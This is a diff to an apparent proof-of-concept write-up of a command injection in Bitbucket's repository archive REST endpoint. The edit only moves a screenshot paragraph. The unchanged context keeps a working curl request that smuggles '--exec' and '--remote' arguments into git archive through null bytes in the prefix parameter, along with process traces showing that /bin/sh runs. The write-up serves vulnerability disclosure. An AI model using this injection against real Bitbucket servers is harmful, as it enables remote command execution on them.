@@ -64,13 +64,12 @@ By injecting `--exec=touch /tmp/pwned` and `--remote=file:///...` via null bytes
 curl "http://localhost:7990/rest/api/latest/projects/TEST/repos/DEMO/archive?at=ebbabd99dd2da7bb5f8ed6dea8c988253fb43260&prefix=x%00--exec=touch+/tmp/pwned%00--remote=file:///var/atlassian/application-data/bitbucket/shared/data/repositories/1%00x&format=zip"   
 ~~~
 
+The image below shows pspy catching the full execution chain - `/usr/bin/git archive` running with `--exec` and `--remote` arguments (PID=74412), spawning `/bin/sh` `touch /tmp/pwned` (PID=74413)
+<img width="2820" height="100" alt="Skärmbild 2026-04-12 165103" src="https://github.com/user-attachments/assets/99eb37aa-01f4-409a-9e9a-71d430bdd22e" />
+
 With `docker exec -it bitbucket ls -la /tmp/pwned` it was possible to verify the file was created.
 See image below.
 <img width="782" height="102" alt="Skärmbild 2026-04-12 164846" src="https://github.com/user-attachments/assets/a69dc09a-b520-4ad4-b96d-46dbac8512c8" />
-
-
-The image below shows pspy catching the full execution chain - `/usr/bin/git archive` running with `--exec` and `--remote` arguments (PID=74412), spawning `/bin/sh` `touch /tmp/pwned` (PID=74413)
-<img width="2820" height="100" alt="Skärmbild 2026-04-12 165103" src="https://github.com/user-attachments/assets/99eb37aa-01f4-409a-9e9a-71d430bdd22e" />
 
 
 
